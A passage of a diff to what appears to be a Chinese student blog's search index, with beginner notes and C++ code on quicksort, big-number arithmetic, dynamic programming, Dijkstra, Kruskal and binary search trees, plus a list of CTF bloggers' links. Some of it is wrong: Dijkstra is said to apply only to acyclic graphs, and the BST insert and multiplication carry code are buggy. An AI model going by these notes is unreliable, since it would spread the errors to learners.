-<p>原理也比较好理解:先把整个数列分成两部分，把两边的数据和中间值比较，比中间值小的放左边，反之放右边，依次操作完毕后这个中间值就是已排序状态，然后分别用同样的方法操作左右两段数据，可以看出这是根据递归定义的排序方法，在递归最底层达到条件：找不到中间值时，整段数据已经排序完毕。这里解释的不是特别全面，有一些情况可以根据代码举个例子理解。</p>
-<p>核心代码大同小异，这里我就摆一种：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quicksort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span><span class="comment">//l,r表示数组的左右两端</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> mid=arr[(l+r)/<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> i=l,j=r;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;=j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(arr[i]&lt;mid) i++;</span><br><span class="line">		<span class="keyword">while</span>(arr[j]&gt;mid) j--;</span><br><span class="line">		<span class="keyword">if</span>(i&lt;=j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">swap</span>(arr[i],arr[j]);</span><br><span class="line">			i++;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l&lt;j) <span class="built_in">quicksort</span>(l,j);</span><br><span class="line">	<span class="keyword">if</span>(r&gt;i) <span class="built_in">quicksort</span>(i,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>排序就先摆两个吧，有空了再贴(画饼</p>
-<h3 id="高精度计算">高精度计算</h3>
-<h4 id="a-b高精度">a+b高精度</h4>
-<p>高精度计算在c++中会出现是因为即使是unsigned long long型的数据最大值也就在二十位数据，也就是18446744073709551615，这样一个数据如果超过了，c++就显示不了了，会发生溢出的现象，但是在实际计算中计算大数据也不少见，因此需要用到高精度的技巧。</p>
-<p>高精度一个很基础的想法就是数无法使用，那就使用数组，基本思路是使用字符串型读入数据，再转入数组之中进行操作。下一步可以理解为模拟竖式加法的做法，依次从个位开始对两个数字进行相加，大于10则保留个位并将十位上进一，依次操作到最后一位，并将结果数组倒序输出即可。</p>
-<p><strong>实现代码：</strong></p>
-<p>读入数组部分：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>计算部分：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>全部代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;<span class="comment">//在long long 存储不了的情况下，基本思路是通过字符串读入，转到数组进行操作 </span></span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">100005</span>],s[<span class="number">100005</span>],add=<span class="number">0</span>;<span class="comment">//s数组用于储存加完之后的数字 ,add用于处理进位的数字 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;<span class="comment">//读入数据，为string型</span></span><br><span class="line">	<span class="built_in">change_arr</span>(a,b);</span><br><span class="line">	<span class="built_in">tooplus</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>())+add<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//判断输出的时候是否需要输出最终多出的一位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;s[i]; </span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里有一道例题，洛谷的p1601,可以用这个解法。</p>
-<h4 id="a-b高精度，a-b高精度">a-b高精度，a*b高精度</h4>
-<p>这两种方法基本一样，要注意的是减法有一些特殊情况，比如负数，输出长度的判断等等，这里我就摆一种简单的，乘法也是需要注意长度区别。</p>
-<p>实现代码：</p>
-<p>减法：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">bool</span> jg;</span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">10005</span>],ans[<span class="number">100005</span>],temp;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[i]=a[a.<span class="built_in">size</span>()-i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=b.<span class="built_in">size</span>();j++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[j]=b[b.<span class="built_in">size</span>()-j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_divide</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr_a[i]&lt;arr_b[i])</span><br><span class="line">		&#123;</span><br><span class="line">			arr_a[i+<span class="number">1</span>]--;</span><br><span class="line">			arr_a[i]+=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ans[i]=arr_a[i]-arr_b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(ans[temp]==<span class="number">0</span>) temp--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_printf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(jg==<span class="literal">true</span>) cout&lt;&lt;<span class="string">&quot;-&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =temp;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;ans[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp&lt;<span class="number">1</span>) cout&lt;&lt;<span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="keyword">if</span>(a&lt;b&amp;&amp;a.<span class="built_in">size</span>()==b.<span class="built_in">size</span>()||a.<span class="built_in">size</span>()&lt;b.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">swap</span>(a,b);</span><br><span class="line">		jg=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="built_in">re_input</span>();</span><br><span class="line">	<span class="built_in">to_divide</span>();</span><br><span class="line">	<span class="built_in">to_printf</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>乘法：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">int</span> arr01[<span class="number">100005</span>],arr02[<span class="number">100005</span>],sum[<span class="number">100005</span>],temp=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_change</span><span class="params">()</span><span class="comment">//倒序存储部分 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr01[i]=a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr02[i]=b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutiply</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">0</span>;j&lt;a.<span class="built_in">size</span>();j++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum[i+j]+=arr01[j]*arr02[i];<span class="comment">//注意下标从1开始，进位减去1 </span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(temp =<span class="number">0</span>;temp&lt;=a.<span class="built_in">size</span>()+b.<span class="built_in">size</span>();temp++)<span class="comment">//处理进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		sum[temp]+=sum[temp<span class="number">-1</span>]/<span class="number">10</span>;</span><br><span class="line">		sum[temp<span class="number">-1</span>]%=<span class="number">10</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//temp=a.size()+b.size();</span></span><br><span class="line">	<span class="keyword">while</span>(sum[temp]==<span class="number">0</span>&amp;&amp;temp&gt;=<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		temp--;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="built_in">re_change</span>();</span><br><span class="line">	<span class="built_in">mutiply</span>();</span><br><span class="line">	<span class="keyword">for</span>(;temp&gt;=<span class="number">0</span>;temp--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;sum[temp];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>以上内容皆为初学者的浅薄理解，如有错误麻烦立即告诉作者，别喷别喷别喷呜呜呜~</p>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
       <tags>
-        <tag>C++</tag>
         <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基础算法02</title>
-    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
-    <content><![CDATA[<p>dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
-<span id="more"></span>
-<h4 id="例题一">例题一</h4>
-<p>先来看一道很简单的例题：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51T.png" alt=""></p>
-<p>具体要求如下：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51U.png" alt=""></p>
-<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
-<p>核心代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>ac代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
         <tag>C++</tag>
-        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
@@ -672,6 +772,19 @@
         <tag>Java</tag>
         <tag>复习</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>大牛的博客(学习用)</title>
+    <url>/2022/09/22/%E5%A4%A7%E7%89%9B%E7%9A%84%E5%8D%9A%E5%AE%A2-%E5%AD%A6%E4%B9%A0%E7%94%A8/</url>
+    <content><![CDATA[<p>这里收录一些大佬的博客，可以跟着学习：</p>
+<span id="more"></span>
+<h2 id="Pwn手师傅们的博客">Pwn手师傅们的博客</h2>
+<p><a href="https://godjj.top/">https://godjj.top/</a></p>
+<p><a href="https://csomepro.github.io/">https://csomepro.github.io/</a></p>
+<p><a href="https://www.cnblogs.com/ZIKH26">https://www.cnblogs.com/ZIKH26</a></p>
+<p><a href="https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner">https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner</a></p>
+<p><a href="http://blog.eonew.cn/">http://blog.eonew.cn/</a></p>
+]]></content>
   </entry>
   <entry>
     <title>大二上软件工程导论课程复习</title>
@@ -756,19 +869,6 @@
       </tags>
   </entry>
   <entry>
-    <title>大牛的博客(学习用)</title>
-    <url>/2022/09/22/%E5%A4%A7%E7%89%9B%E7%9A%84%E5%8D%9A%E5%AE%A2-%E5%AD%A6%E4%B9%A0%E7%94%A8/</url>
-    <content><![CDATA[<p>这里收录一些大佬的博客，可以跟着学习：</p>
-<span id="more"></span>
-<h2 id="Pwn手师傅们的博客">Pwn手师傅们的博客</h2>
-<p><a href="https://godjj.top/">https://godjj.top/</a></p>
-<p><a href="https://csomepro.github.io/">https://csomepro.github.io/</a></p>
-<p><a href="https://www.cnblogs.com/ZIKH26">https://www.cnblogs.com/ZIKH26</a></p>
-<p><a href="https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner">https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner</a></p>
-<p><a href="http://blog.eonew.cn/">http://blog.eonew.cn/</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>线代预习一些知识</title>
     <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
     <content><![CDATA[<p>这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
@@ -839,123 +939,6 @@
       </tags>
   </entry>
   <entry>
-    <title>计算机体系结构复习</title>
-    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p>大一下预习计算机体系结构</p>
-<span id="more"></span>
-<h4 id="原码反码补码">原码反码补码</h4>
-<ul>
-<li>原码：二进制形式</li>
-<li>反码：原码除符号位不变，其余全部取反</li>
-<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
-</ul>
-<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
-]]></content>
-      <categories>
-        <category>大一课程</category>
-      </categories>
-      <tags>
-        <tag>计算机原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基础算法03</title>
-    <url>/2022/11/27/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9503/</url>
-    <content><![CDATA[<p>不过是笔记本罢了(悲~</p>
-<h2 id="Dijkstra-算法（狄克斯特拉算法）">Dijkstra 算法（狄克斯特拉算法）</h2>
-<p>这是一种求解无负权边图的最短路径的算法，他的大概过程是先将<strong>已确定最短路径</strong>的点和<strong>未确定最短路径</strong>的点分别分为两个集合，一开始所有点都处于后者集合，随后依次从后者集合取出最短路长度最小的点，移到前者集合中。这里要注意这个算法只适用于有向无环图。</p>
-<p>该算法是求源点到其他各个顶点的最短路径，如果求解任意两个顶点的最短路径，则需要以每个顶点为源点，重复调用n次Dijkstra算法。</p>
-<h3 id="算法步骤：">算法步骤：</h3>
-<ol>
-<li>初始化，令集合S={u}，对于集合V-S中的所有顶点i，$dist[i]=G.Edge[u][i]$。</li>
-<li>找最小，在集合V-S中依照贪心策略寻找使得dist[j]具有最小值的顶点t，即$dist[t]=min(dist[j])$，即顶点t就是集合V-S中距离原点u最近的顶点。</li>
-<li>将顶点t加入集合S中，更新V-S</li>
-<li>如果结合V-S为空则算法结束，否则跳转第五步</li>
-<li>在第2步中已经找到了源点到t的最短路径，那么对集合V−S中所有与顶点t相邻的顶点j，都可以借助t走捷径。如果$dist[j]&gt;dist[t]+G.Edge[t][j]$，则$dist[j]=dist[t]+G.Edge[t][j]$，记录顶点j的前驱为t，有p[j]=t，转到第2步。</li>
-</ol>
-<h3 id="代码实现">代码实现</h3>
-<p>首先该算法需要一个图结构，包含顶点集合，边集合，顶点数，边数，</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">	VexType Vex[MaxVnum];</span><br><span class="line">	EdgeType Edge[MaxVnum][MaxVnum];</span><br><span class="line">	<span class="type">int</span> vexnum,edgenum; <span class="comment">//顶点数，边数</span></span><br><span class="line">&#125;AMGragh;</span><br></pre></td></tr></table></figure>
-<p>需要一个查找下标的函数</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">locatevex</span><span class="params">(AMGragh G,VexType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;G.vexnum;i++)<span class="comment">//查找顶点信息的下标</span></span><br><span class="line">		<span class="keyword">if</span>(x==G.Vex[i])</span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//没找到</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Kruskal算法实现最小生成树">Kruskal算法实现最小生成树</h2>
-<p>首先我们先知道一个最小生成树的性质：树中一定不会出现环，其边数等于顶点数减一</p>
-<p>这个算法采用边贪心策略，基本思路是隐去图中的所有边，这样所有的点都成为了一个个独立的块。然后对所有的边按照权来排序，排序结束后按照边权从小到大一条一条加入当前的最小生成树当中，如果成环则舍弃这个边，随后重复这个过程，知道边数等于总顶点数减一或者测试完所有边时结束。值得一提的是，如果结束之后最小生成树的边数小于总顶点数减1，说明该图不连通。</p>
-<h2 id="二叉搜索（查找）树">二叉搜索（查找）树</h2>
-<p>二叉搜索树的中序遍历具备有序性，因此二分查找树的查找效率较高。</p>
-<p>基本步骤：</p>
-<ul>
-<li>若整个树为空，查找失败，返回空指针</li>
-<li>若非空，将待查找值x和关键字T-&gt;data比较，若小于，查找左子树，大于，查找右子树</li>
-</ul>
-<p>前面的代码较简单，查找采用的是递归查找:</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">	ElemType data;</span><br><span class="line">	Node *lchild,*rchild;</span><br><span class="line">&#125;Node,*BSTree;</span><br><span class="line"></span><br><span class="line"><span class="function">BSTree <span class="title">Search</span><span class="params">(BSTree T,ElemType value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((!T)||value==T-&gt;data)</span><br><span class="line">		<span class="keyword">return</span> T;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(value&lt;T-&gt;data)</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Search</span>(T-&gt;lchild,value);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Search</span>(T-&gt;rchild,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertTree</span><span class="params">(BSTree &amp;T,ElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!T)</span><br><span class="line">	&#123;</span><br><span class="line">		BSTree S=<span class="keyword">new</span> Node;</span><br><span class="line">		S-&gt;data=e;</span><br><span class="line">		S-&gt;lchild=<span class="literal">NULL</span>;</span><br><span class="line">		S-&gt;rchild=<span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(e&gt;T-&gt;data) <span class="built_in">InsertTree</span>(T-&gt;rchild,e);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(e&lt;T-&gt;data) <span class="built_in">InsertTree</span>(T-&gt;lchild,e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span 